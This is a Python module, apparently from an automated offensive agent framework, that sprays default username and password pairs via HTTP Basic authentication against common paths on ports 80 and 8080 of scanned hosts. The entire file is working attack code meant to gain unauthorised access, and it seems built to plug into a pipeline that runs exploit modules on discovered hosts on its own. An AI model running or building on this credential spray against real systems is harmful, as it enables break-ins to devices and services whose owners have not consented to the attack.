"""HTTP default/basic credential spray."""

from __future__ import annotations

import base64
import urllib.error
import urllib.request
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

PATHS = ("/", "/admin", "/login")
CREDS: Sequence[Tuple[str, str]] = (
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
)


class HttpDefaultsModule(ExploitModule):
    name = "http_defaults"
    ports = (80, 8080)

    def run(self, host: HostHit) -> bool:
        ports = [p for p in host.open_ports if p in self.ports]
        if not ports:
            return False
        for port in ports:
            for path in PATHS:
                for user, password in CREDS:
                    if self._try_basic(host.ip, port, path, user, password):
                        return True
        return False

    def _try_basic(self, ip: str, port: int, path: str, user: str, password: str) -> bool:
        url = f"http://{ip}:{port}{path}"
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {token}")
        try:
            with urllib.request.urlopen(req, timeout=4.0) as resp:
                return resp.status < 400
        except urllib.error.HTTPError as exc:
            return exc.code not in (401, 403)
        except Exception:
            return False
